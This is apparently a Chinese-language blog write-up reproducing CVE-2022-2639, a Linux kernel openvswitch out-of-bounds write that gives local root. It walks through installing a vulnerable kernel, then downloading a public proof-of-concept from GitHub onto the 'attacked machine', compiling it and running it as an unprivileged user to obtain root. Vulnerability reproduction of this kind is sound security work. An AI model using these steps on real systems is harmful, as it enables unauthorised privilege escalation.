CVE-2022-2639 Linux Kernel openvswitch 模块权限提升漏洞复现
2023-03-15 15:21:10

1. 漏洞复现

1.1. 漏洞介绍

Linux Kernel openvswitch 模块权限提升漏洞 EXP 在互联网上公开，漏洞编号为CVE-2022-2639。在处理大量actions的情况下，Linux Kernel openvswitch 模块存在越界写入漏洞。本地经过身份认证的攻击者可利用此漏洞提升至ROOT权限。

1.2. 影响版本

Linux Kernel 3.13 – 5.18 >= 5.18

1.3. 环境搭建

1、查看Linux内核信息


注：发现Linux内核并不在漏洞影响范围中，这时就要升级内核了

2、下载内核 RPM

wget https://mirrors.tripadvisor.com/centos-vault/altarch/7.6.1810/experimental/x86_64/Packages/kernel-4.19.43-300.el7.x86_64.rpm

wget https://mirrors.tripadvisor.com/centos-vault/altarch/7.6.1810/experimental/x86_64/Packages/kernel-core-4.19.43-300.el7.x86_64.rpm

wget https://mirrors.tripadvisor.com/centos-vault/altarch/7.6.1810/experimental/x86_64/Packages/kernel-modules-4.19.43-300.el7.x86_64.rpm

3、安装内核

yum install kernel-*

4、确认已安装内核版本

rpm -qa |grep kernel

5、查看启动顺序

awk -F\' '$1=="menuentry " {print $2}' /etc/grub2.cfg

6、设置启动顺序

grub2-set-default 0

7、重启生效

reboot

这时再查看Linux内核信息。

uname -r

Linux版本刚好在漏洞影响范围中，这时就可以开始进行复现了。

1.1. 漏洞复现

1、将POC下载到服务器上进行编译。

POC地址：

https://github.com/avboy1337/CVE-2022-2639-PipeVersion

使用wget下载到被攻击机上

wget https://github.com/avboy1337/CVE-2022-2639-PipeVersion

2、编译完成给POC执行的权限并切换到test普通用户执行POC。

centos7编译不成功，可以试试在kali上编译。

3、复现成功截图

执行完成后可以看到test普通用户的uid为root，到此漏洞就已经复现成功了。
